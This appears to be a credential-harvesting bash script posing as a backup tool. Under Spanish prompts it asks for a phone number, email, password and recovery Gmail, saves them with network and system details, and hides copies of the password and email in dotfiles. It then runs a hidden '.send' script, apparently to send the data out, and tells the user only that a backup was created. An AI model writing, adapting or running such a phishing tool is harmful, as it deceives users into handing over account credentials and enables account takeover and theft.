bash .banner
echo "Introduce tu numero telefonico:"
read input
bash .banner
echo "Introduce tu correo:"
read input1
bash .banner
echo "Introduce tu contraseña:"
read input2
bash .banner
echo "Gmail de recuperacion:"
read input3
bash .banner
mkdir Info
cd Info
echo "$input2" |& tee password.txt
echo "$input1" |& tee correo.txt
echo "$input" |& tee num.txt
echo "$input3" |& tee gmail.txt
ifconfig |& tee ip.txt
uname |& tee op.txt
uname -o |& tee op1.txt
uname -a |& tee op2.txt
uname -m |& tee op3.txt
clear
cd ..
tar -czf BackUp.tar Info
cp Info/password.txt .password.txt
cp Info/correo.txt .correo.txt
cp Info/gmail.txt .gmail.txt
bash .banner
echo "Backup creado exitosamente..."
python .send
rm BackUp.tar
clear
